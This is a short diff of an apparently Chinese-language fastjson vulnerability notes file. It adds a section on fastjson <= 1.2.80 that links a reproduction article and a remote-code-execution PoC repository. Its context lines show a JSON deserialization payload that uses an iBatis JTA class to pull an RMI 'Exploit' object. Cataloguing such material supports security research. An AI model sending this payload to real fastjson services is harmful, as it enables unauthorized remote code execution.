@@ -539,3 +539,13 @@ eyJhIjoiXHgaGiJ9
 ```json
 {\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"UserTransaction\":\"rmi://localhost:1099/Exploit\"}}
 ```
+
+---
+
+## fastjson <= 1.2.80
+
+**相关文章**
+- [Fastjson1.2.80漏洞复现](https://hosch3n.github.io/2022/09/01/Fastjson1-2-80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)
+
+**POC | Payload | exp**
+- [Lonely-night/fastjsonVul](https://github.com/Lonely-night/fastjsonVul) - fastjson 80 远程代码执行漏洞复现
